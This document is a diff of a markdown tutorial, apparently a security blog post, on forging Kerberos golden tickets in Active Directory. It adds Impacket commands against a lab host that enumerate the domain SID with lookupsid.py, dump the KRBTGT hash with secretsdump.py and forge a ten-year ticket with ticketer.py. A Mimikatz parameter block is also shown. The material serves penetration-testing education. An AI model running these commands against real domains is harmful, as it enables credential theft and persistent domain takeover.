@@ -19,16 +19,20 @@ toc: true
 
 
 
-<img src="/img/golden/sid.PNG" alt="Getting-gz" width="800" height="150"> 
 
 ## Forging Kerberos Tickets
+* Forging Kerberos tickets depends on the password hash available to the attacker
+* Golden Ticket requires the KRBTGT password hash.
+* Silver ticket requires the Service Account (either the computer account or user account) password hash.
+* Create anywhere and user anywhere on the network, without elevated rights.
 
 ## requirements for forging TGT
  * Domain Name
  * SID
  * Domain KRBTGT Account NTLM password hash
  * Impersonate user
- * 
+ 
+ 
 ```
 kerberos::golden  ## Name of the module  
 /user:Administrator  ## username of which the TGT is generated
@@ -43,4 +47,28 @@ kerberos::golden  ## Name of the module
 ```
 ## golden ticket with Mimikatz
 ## golden ticket with Impacket
+used for lookupid python script to enumerate the Domain SID.
+```
+python3 lookupsid.py user/Administrator:password@ip
+python3 lookupsid.py admin/Administrator:p@ssw0rd@192.168.128.140
+```
+
+<img src="/img/golden/sidk.PNG" alt="Getting-gz" width="800" height="150"> 
+
+used secretsdump.py the python script for extracting Krbtgt hash
+```
+python3 secretsdump.py administrator:p@ssw0rd@192.168.128.140 -outputfile krbhash -user-status   
+```
+
+<img src="/img/golden/secretdump.PNG" alt="Getting-gz" width="800" height="150"> 
+
+Use ticketer.py script that will create TGT/TGS tickets,Tickets duration is fixed to 10 years from now.
+```
+sudo ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
+sudo python3 ticketer.py -nthash 564e72d3c6c1927de1d2f252665e7c54 -domain-sid S-1-5-21-750046758-1551849808-2392872301 -domain karim.net admin
+```
+
+<img src="/img/golden/crer.PNG" alt="Getting-gz" width="800" height="150"> 
+
+
 ## golden ticket with Rubeus.exe
